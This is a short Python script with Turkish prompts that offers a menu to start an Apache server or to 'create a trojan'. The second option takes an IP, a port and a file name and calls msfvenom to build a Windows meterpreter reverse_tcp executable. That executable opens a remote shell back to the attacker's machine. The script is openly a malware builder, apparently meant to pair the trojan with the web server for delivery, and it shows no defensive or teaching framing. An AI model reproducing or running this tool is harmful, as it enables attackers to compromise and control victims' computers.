import os 
import time


print("""

1 - apache server başlat
2 - trojan oluştur

""")


opr = input("Hedef işlem numaranız : ")


if (opr == "1"):
	print("Apache server başlatılıyor...")
	time.sleep(2)
	os.system("clear && service apache2 start")
	
if (opr == "2"):
	os.system("clear")
	ip = input("Local ip adresinizi giriniz : ")
	port = input("4 haneli port numaranızı giriniz ör(1234) : ")
	name = input("Trojana isim verin : ")
	os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe -o "+name)
	
	
	
